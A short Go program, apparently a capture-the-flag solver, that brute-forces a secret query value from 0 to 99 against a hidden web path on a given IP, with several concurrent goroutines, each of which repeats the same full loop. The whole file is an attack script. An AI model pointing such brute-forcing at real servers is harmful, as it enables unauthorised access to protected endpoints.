package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"sync"
)

type methods interface {
	guessKey(wg *sync.WaitGroup)
}

type Guess struct {
	ip string
}

func (g *Guess) guessKey(wg *sync.WaitGroup) {
	defer wg.Done()
	for i := 0; i <= 99; i++ {
		resp, err := http.Get("http://" + g.ip + "/th1s_1s_h1dd3n/?secret=" + strconv.Itoa(i))
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(string(body))

	}
}

func callGuessKey(m methods, concurrency int) {
	var wg sync.WaitGroup
	wg.Add(concurrency)

	for i := 0; i < concurrency; i++ {
		go m.guessKey(&wg)
	}

	wg.Wait()
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println(`
  _  __             _____
 | |/ /            / ____|
 | ' / ___ _   _  | |  __ _   _  ___  ___ ___  ___ _ __
 |  < / _ \ | | | | | |_ | | | |/ _ \/ __/ __|/ _ \ '__|
 | . \  __/ |_| | | |__| | |_| |  __/\__ \__ \  __/ |
 |_|\_\___|\__, |  \_____|\__,_|\___||___/___/\___|_|
            __/ |
           |___/
                | Made By Droid |
---------------------------------------------------------  
Usage: ./guess <ip> <concurrency>`)
		os.Exit(1)
	}

	g := &Guess{
		ip: os.Args[1],
	}

	concurrency, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Invalid concurrency value")
		os.Exit(1)
	}

	callGuessKey(g, concurrency)
}
